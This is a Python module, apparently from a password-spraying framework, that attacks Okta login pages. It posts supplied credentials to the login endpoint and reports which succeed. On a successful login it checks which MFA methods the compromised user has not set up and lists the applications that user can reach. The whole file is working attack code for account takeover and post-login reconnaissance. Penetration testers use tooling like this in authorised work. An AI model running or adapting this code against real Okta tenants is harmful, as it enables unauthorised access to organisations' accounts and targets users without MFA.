#! /usr/bin/python
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
from selenium import webdriver
from urllib2 import urlopen
import json
from bs4 import BeautifulSoup

class oktaBrute(webModule):
    def __init__(self, config, display, lock):
        super(oktaBrute, self).__init__(config, display, lock)
        self.fingerprint="okta" # What is used to fingerprint this web app?
        self.response="302" # What constitutes a valid response?
    def somethingCool(self, config, payload, c, cookies):
        #check if 2FA is setup
        cget = c.get(config["HOST"] + '/user/settings/account', cookies=cookies, allow_redirects=False, verify=False)
        MFAtypes =  re.findall("<dt>(.*?)</dt>", cget.content, re.DOTALL)
        setup =  re.findall("<dt>(.*?)</dd>", cget.content, re.DOTALL)
        enabled = re.findall('<span class="read-only-input text-light">(.*?)</span>', str(setup), re.DOTALL)
        if not enabled:
            enabled = re.findall('</span>(.*?)</a>', str(setup), re.DOTALL)
        enabled = [x.strip('\\n') for x in enabled]
        enabled = [x.strip(' ') for x in enabled]
        MFAtypes = [x.strip('\n') for x in MFAtypes]
        MFAtypes = [x.strip(' ') for x in MFAtypes]
        d = dict(zip(MFAtypes, enabled))
        dictcount = str(d).count(':')
        GA = d['Google Authenticator Mobile App']
        TM = d['Text Message Code']
        OVA = d['Okta Verify Mobile App']
        if ( GA == 'Setup' ):
            print("[!]    Google Authenticator is not setup.")
        else:
            print('[-]    Google Authenticator is setup.')
        if ( TM == 'Setup' ):
            print("[!]    Text Message Code is not setup.")
        else:
            print('[-]    Text Message Code is setup.')
        if ( OVA == 'Setup' ):
            print("[!]    Okta Verify Mobile App is not setup.")
        else:
            print('[-]    Okta Verify Mobile App is setup.')
        try:
            VC = d['Voice Call']
            if ( VC == 'Setup' ):
                print("[!]    Voice Call is not setup.")
            else:
                print('[-]    Voice Call is setup.')
        except:
            pass

        #Parse out apps
        cget = c.get(config["HOST"] + '/api/v1/users/me/home/tabs?expand=items%2Citems.resource', cookies=cookies, allow_redirects=False, verify=False)
        j = json.loads(cget.content)
        apps = re.findall('appDisplayName', str(j), re.DOTALL)
        appCount = apps.count('appDisplayName')
        appCount = appCount - 2
        count = 0
        print('[+]      The following apps are available: ')
        while (count < appCount):
            app = j[0]['_embedded']['items'][count]['_embedded']['resource']['label']
            print('[+]            ' + app)
            count = count + 1


    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        #Create a session and check if account is valid  THIS IS AN EXAMPLE ONLY
        with session() as c:
            resp1 = c.get(config["HOST"] + '/login/do-login', verify=False)
            cookies = resp1.cookies
            cpost = c.post(config["HOST"] + '/login/do-login', cookies=cookies, data=payload, allow_redirects=False, verify=False)
            m = re.search(self.response, str(cpost))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                    print("[!] Time to do something cool!")
                    self.somethingCool(config, payload, c, cookies)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
